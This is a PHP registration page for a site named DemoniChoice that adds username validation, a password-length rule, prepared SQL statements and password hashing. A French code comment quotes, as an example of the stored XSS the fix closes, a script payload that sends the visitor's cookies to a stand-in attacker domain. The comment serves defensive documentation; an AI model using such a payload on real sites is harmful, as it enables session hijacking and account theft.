<?php
require "config.php";
require "safe_redirect.php";

$location = safe_redirect_target($_GET['cameFrom'] ?? null);
$classeTaken = 'Taken';
$classeRegistered = "notRegistered";
$errorMessage = "";

if ($_POST) {

    $username = trim($_POST["username"]);
    $password = $_POST["password"];

    // AVANT : aucune règle sur le username -> un pseudo comme
    // <script>document.location='https://vol-de-cookies.com/'+document.cookie</script>
    // était accepté et ensuite ré-affiché tel quel ailleurs sur le site (XSS stocké).
    // On restreint maintenant aux lettres/chiffres/underscore/tiret, 3 à 20 caractères.
    if (!preg_match('/^[a-zA-Z0-9_-]{3,20}$/', $username)) {
        die("Le nom d'utilisateur doit contenir entre 3 et 20 caractères (lettres, chiffres, _ ou -).");
    }

    // AVANT : aucune exigence de longueur/robustesse sur le mot de passe.
    if (strlen($password) < 8) {
        die("Le mot de passe doit contenir au moins 8 caractères.");
    }

    $stmt = $conn->prepare("SELECT id FROM users WHERE username = ?");
    $stmt->bind_param("s", $username);
    $stmt->execute();
    $result = $stmt->get_result();

    if ($result->num_rows > 0) {
        $classeTaken = 'Taken active';
    } else {
        $hashedPassword = password_hash($password, PASSWORD_DEFAULT);

        $stmt = $conn->prepare("INSERT INTO users (username, password, status) VALUES (?, ?, 'member')");
        $stmt->bind_param("ss", $username, $hashedPassword);
        $stmt->execute();
        $classeRegistered = "registered";
    }

}
?>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>DemoniChoice</title>
        <link rel="stylesheet" href="style/log.css" > 
        <link href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css" rel="stylesheet">   
        <link rel="manifest" href="site.webmanifest">
        <link rel="icon" type="image/png" sizes="32x32" href="style/res/Logo32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="style/res/Logo16.png">
        <link rel="shortcut icon" href="style/res/Logo.ico">
        <link rel="icon" type="image/png" sizes="32x32" href="style/res/Logo.png">
        <link rel="apple-touch-icon" sizes="180x180" href="style/res/Logo180.png">
        <link rel="apple-touch-icon" sizes="167x167" href="style/res/Logo167.png">
        <link rel="apple-touch-icon" sizes="152x152" href="style/res/Logo152.png">
    </head>
    <body>
        <div class="form-container">
            <div class="form-header">
                <h3>Sign Up</h3>
            </div>
            <form class="input-container" method="post">
                <input type="text" placeholder="username" name="username" required> 
                <input name="password" type="password" placeholder="password" required>   
                <div class="bottom">
                    <li class="<?php echo $classeTaken; ?>">Username already taken.</li>
                                <li class="<?php echo $classeRegistered; ?>">You have been registered please go back to the login screen and log in.</li>
                    <button class="submit" type="submit">SIGN UP</button>                 
                </div>  
                <div class="link">
                    Already have an account ? 
                    <a href="login.php?cameFrom=<?= htmlspecialchars($location) ?>"> Log In !</a>
                </div>
            </form>
        </div>
    </body>
    <footer>
    </footer>
</html>
